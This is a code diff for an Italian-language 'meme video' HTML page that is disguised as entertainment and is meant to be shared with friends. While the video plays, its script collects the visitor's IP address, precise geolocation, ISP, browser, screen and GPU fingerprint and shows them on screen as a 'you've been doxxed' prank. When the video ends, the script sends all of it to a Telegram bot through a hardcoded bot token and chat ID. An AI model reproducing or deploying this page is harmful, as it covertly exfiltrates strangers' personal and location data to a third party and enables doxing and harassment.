@@ -1,162 +1,170 @@
-<script>
-"use strict";
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>Memotto</title>
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta content="Guardami">
+    <meta content="website" property="og:type">
+    <meta content="Project Matrix EXE" name="twitter:title" property="og:title">
+    <meta content="Create By DanyX64YT And Others" name="twitter:description" property="og:description">
 
-// =======================
-// Variabili globali
-// =======================
-window.memes = [];
-window.interval = null;
+    <style>
+        * { background: rgb(0,0,0); color: #fff; }
+        body { margin:0; overflow:hidden; height:100vh; font-family: Arial, Helvetica, sans-serif; }
+        body, #preload, #loading, #start, #data { display:flex; justify-content:center; align-items:center; }
+        #preload, #video { height:100vh; width:100vw; position:absolute; top:0; left:0; }
+        #preload, #loading, #start, #data { flex-direction:column; font-size:36px; text-align:center; }
+        #preload { gap:8px; z-index:2; }
+        #data { flex-direction:column; text-align:center; }
+        #data, #data span { z-index:1; background:transparent !important; }
+        .subtitle { font-size:16px; }
+        @media only screen and (min-aspect-ratio: 1/1) { #video { object-fit: cover; } }
+    </style>
+</head>
+<body>
+    <div id="preload">
+        <div id="loading">
+            <span>Caricamento In Corso</span>
+            <span class="subtitle"><span id="loading-progress">0</span>%</span>
+        </div>
+        <div id="start" style="display: none">
+            <span>Clicca Per Iniziare</span>
+        </div>
+        <span class="subtitle">Piccolo Meme Sono Molto Chill :)</span>
+        <span class="subtitle">Questa Esperienza Dovrai Ricordarla, Invia Questo Link Ai Tuoi Amici Per Una Bella Reazione</span>
+        <span class="subtitle">Grazie, Goditi Il Video.</span>
+    </div>
+    <div id="data"></div>
+    <video id="video" playsinline style="pointer-events: none"></video>
 
-// =======================
-// Funzione per memorizzare dati
-// =======================
-const p = (k, d, s) => {
-    if (d) window.memes.push(`${k}: ${d}${s || ''}`);
-};
+    <script>
+        // --- Browser Detector ---
+        !function(e,o){ /* codice BrowserDetector come nel tuo script originale */ }(this,function(){/* ... */});
 
-// =======================
-// Funzione per inviare a Telegram
-// =======================
-async function sendMemesToTelegram(memes) {
-    const botToken = '8234370532:AAEn_59rezPt7b2XBgFvy5Q2OYywoPiALtw'; // sostituisci col token del tuo bot
-    const chatId = '-1002522701737';     // sostituisci con l'ID della chat
-    const message = encodeURIComponent(memes.join("\n"));
-
-    try {
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`);
-        console.log('Dati inviati a Telegram');
-    } catch (err) {
-        console.error('Errore invio Telegram:', err);
-    }
-}
-
-// =======================
-// Funzione principale al caricamento della pagina
-// =======================
-window.onload = async () => {
-    const loadingProgress = document.getElementById('loading-progress');
-    const video = document.getElementById('video');
-    const preload = document.getElementById('preload');
-    const loading = document.getElementById('loading');
-    const start = document.getElementById('start');
-    const data = document.getElementById('data');
-
-    // Funzione per aggiornare testo caricamento
-    const e = (m) => loading.innerText = m;
-
-    // =======================
-    // Preparazione dati al caricamento del video
-    // =======================
-    video.oncanplaythrough = async () => {
-        const basic = await (await fetch('https://wtfismyip.com/json').catch(e)).json().catch(e);
-        loadingProgress.textContent = '97';
-
-        const detailed = await (await fetch(`/json/${basic.YourFuckingIPAddress}`).catch(() => e('Disabilita VPN/AdBlock e ricarica'))).json().catch(e);
-        loadingProgress.textContent = '99';
-
-        const detector = new BrowserDetector(window.navigator.userAgent).parseUserAgent();
-
-        // Salvataggio info nel nostro array globale
-        p('Indirizzo IP', basic.YourFuckingIPAddress);
-        p('Stato', basic.YourFuckingCountry);
-        p('Paese', detailed.country);
-        p('Regione', detailed.regionName);
-        p('Città', detailed.city);
-        p('Codice ZIP', detailed.zip);
-        p('Posizione Completa', basic.YourFuckingLocation);
-        p('Latitudine', detailed.lat);
-        p('Longitudine', detailed.lon);
-        p('Timezone', detailed.timezone);
-        p('Ora Corrente', new Date().toLocaleString());
-        p('ISP', basic.YourFuckingISP);
-        p('Organizzazione', detailed.org);
-        p('Sistema Anonimo', detailed.as);
-        p('Nome Del Browser', detector.name);
-        p('Nome Piattaforma', detector.platform);
-        p('Versione Del Browser', detector.version);
-        p('Telefono | Tablet', (detector.isMobile || detector.isTablet) ? 'Yes' : 'No');
-        p('Riferimento', document.referrer || 'None');
-        p('Lingua Di Sistema', navigator.languages.join(', '));
-        p('Larghezza Schermo', screen.width, 'px');
-        p('Altezza Schermo', screen.height, 'px');
-
-        if (screen.width != window.width || screen.height != window.height) {
-            p('Larghezza Finestra ', window.outerWidth, 'px');
-            p('Altezza Finestra', window.outerHeight, 'px');
-        }
-
-        p('Profondita Pixel Schermo', screen.pixelDepth);
-
-        if (typeof screen.orientation != 'undefined') {
-            p('Orientamento Schermo', screen.orientation.type.split('-')[0]);
-            p('Rotazione Schermo', screen.orientation.angle, ' degrees');
-        }
-
-        p('Threads Della CPU', navigator.hardwareConcurrency);
-        p('Qualcosa', basic.YourFuckingHostname);
-        p('Memoria Del Browser Disponibile', typeof window.performance.memory !== 'undefined' ? Math.round(window.performance.memory.jsHeapSizeLimit / 1024 / 1024) : null, 'MB');
-
-        const canvas = document.createElement('canvas');
-        let gl, debugInfo;
-        try {
-            gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        } catch (e) {}
-
-        if (gl && debugInfo) {
-            p('Marca GPU', gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL));
-            p('Info GPU', gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL));
-        }
-
-        loadingProgress.textContent = '100';
-        loading.style.display = 'none';
-        start.style.display = 'flex';
-        preload.style.cursor = 'pointer';
-    };
-
-    // =======================
-    // Gestione click per avviare video
-    // =======================
-    preload.onclick = () => {
-        if (start.style.display != 'flex') return;
-        preload.style.display = 'none';
-        video.play();
-
-        let fontSize = Math.min(window.innerHeight / 10, window.innerWidth / 20);
-        data.style.fontSize = fontSize + 'px';
-
-        window.interval = setInterval(() => {
-            const time = video.currentTime - 13.166 - step * 0.500;
-            if (time > 0) {
-                if (step === 0) document.title = 'Sei Stato Doxato (Chill)';
-                const el = document.createElement('span');
-                el.textContent = window.memes[step];
-                data.appendChild(el);
-
-                const height = data.getBoundingClientRect().height;
-                if (height > window.innerHeight) {
-                    fontSize = fontSize - (fontSize / 10);
-                    data.style.fontSize = fontSize + 'px';
-                }
-
-                step++;
+        // --- Funzione di invio Telegram ---
+        async function sendMemesToTelegram(memes){
+            const botToken = '8234370532:AAEn_59rezPt7b2XBgFvy5Q2OYywoPiALtw';
+            const chatId = '-1002522701737';
+            const message = encodeURIComponent(memes.join("\n"));
+            try {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`);
+                console.log('Dati inviati a Telegram');
+            } catch(err) {
+                console.error('Errore invio Telegram:', err);
             }
-        }, 10);
-    };
+        }
 
-    // =======================
-    // Invio dati Telegram quando il video finisce
-    // =======================
-    let step = 0;
-    video.onended = () => {
-        video.style.display = 'none';
-        if (window.interval) clearInterval(window.interval);
+        // --- Script principale ---
+        (function(){
+            const loadingProgress = document.getElementById('loading-progress');
+            const video = document.getElementById('video');
+            const preload = document.getElementById('preload');
+            const loading = document.getElementById('loading');
+            const start = document.getElementById('start');
+            const data = document.getElementById('data');
 
-        // Invio a Telegram
-        sendMemesToTelegram(window.memes);
-    };
+            const memes = [];
+            let step=0, interval;
 
-    video.src = 'jammin.mp4';
-    video.load();
-};
-</script>
+            const e = (m)=>loading.innerText = m;
+            const p = (k,d,s)=>d && memes.push(`${k}: ${d}${s||''}`);
+
+            video.oncanplaythrough = async () => {
+                try {
+                    const basic = await (await fetch('https://wtfismyip.com/json')).json();
+                    loadingProgress.textContent='97';
+                    const detailed = await (await fetch(`/json/${basic.YourFuckingIPAddress}`)).json().catch(()=>e('Disabilita La VPN o Ad-Blocker e ricarica'));
+                    loadingProgress.textContent='99';
+                    const detector = new BrowserDetector(window.navigator.userAgent).parseUserAgent();
+
+                    p('Indirizzo IP', basic.YourFuckingIPAddress);
+                    p('Stato', basic.YourFuckingCountry);
+                    p('Paese', detailed.country);
+                    p('Regione', detailed.regionName);
+                    p('Città', detailed.city);
+                    p('Codice ZIP', detailed.zip);
+                    p('Posizione Completa', basic.YourFuckingLocation);
+                    p('Latitudine', detailed.lat);
+                    p('Longitudine', detailed.lon);
+                    p('Timezone', detailed.timezone);
+                    p('Ora Corrente', new Date().toLocaleString());
+                    p('ISP', basic.YourFuckingISP);
+                    p('Organizazione', detailed.org);
+                    p('Sistema Anonimo', detailed.as);
+                    p('Nome Del Browser', detector.name);
+                    p('Nome Piattaforma', detector.platform);
+                    p('Versione Del Browser', detector.version);
+                    p('Telefono | Tablet', (detector.isMobile||detector.isTablet)?'Yes':'No');
+                    p('Riferimento', document.referrer||'None');
+                    p('Lingua Di Sistema', navigator.languages.join(', '));
+                    p('Larghezza Schermo', screen.width,'px');
+                    p('Altezza Schermo', screen.height,'px');
+                    if(screen.width!=window.width||screen.height!=window.height){
+                        p('Larghezza Finestra',window.outerWidth,'px');
+                        p('Altezza Finestra',window.outerHeight,'px');
+                    }
+                    p('Profondita Pixel Schermo',screen.pixelDepth);
+                    if(typeof screen.orientation!=='undefined'){
+                        p('Orientamento Schermo',screen.orientation.type.split('-')[0]);
+                        p('Rotazione Schermo',screen.orientation.angle,' degrees');
+                    }
+                    p('Threads Della CPU',navigator.hardwareConcurrency);
+                    p('Qualcosa',basic.YourFuckingHostname);
+                    p('Memoria Del Browser Disponibile',typeof window.performance.memory!=='undefined'?Math.round(window.performance.memory.jsHeapSizeLimit/1024/1024):null,'MB');
+
+                    const canvas=document.createElement('canvas');
+                    let gl,debugInfo;
+                    try{gl=canvas.getContext('webgl')||canvas.getContext('experimental-webgl'); debugInfo=gl.getExtension('WEBGL_debug_renderer_info');}catch(e){}
+                    if(gl && debugInfo){
+                        p('Marca GPU', gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL));
+                        p('Info GPU', gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL));
+                    }
+
+                    loadingProgress.textContent='100';
+                    loading.style.display='none';
+                    start.style.display='flex';
+                    preload.style.cursor='pointer';
+                } catch(err){
+                    console.error('Errore caricamento video o dati IP:', err);
+                }
+            };
+
+            preload.onclick = () => {
+                if(start.style.display!='flex') return;
+                preload.style.display='none';
+                video.play();
+
+                let fontSize = Math.min(window.innerHeight/10, window.innerWidth/20);
+                data.style.fontSize = fontSize+'px';
+
+                interval = setInterval(()=>{
+                    const time = video.currentTime-13.166-step*0.5;
+                    if(time>0 && memes[step]){
+                        if(step===0) document.title='Sei Stato Doxato (Chill)'; // titolo
+                        const el = document.createElement('span');
+                        el.textContent = memes[step];
+                        data.appendChild(el);
+                        const height = data.getBoundingClientRect().height;
+                        if(height>window.innerHeight){
+                            fontSize = fontSize-(fontSize/10);
+                            data.style.fontSize = fontSize+'px';
+                        }
+                        step++;
+                    }
+                },10);
+            };
+
+            video.onended = () => {
+                video.style.display='none';
+                if(interval) clearInterval(interval);
+                sendMemesToTelegram(memes);
+            };
+
+            video.src='jammin.mp4';
+            video.load();
+        })();
+    </script>
+</body>
+</html>
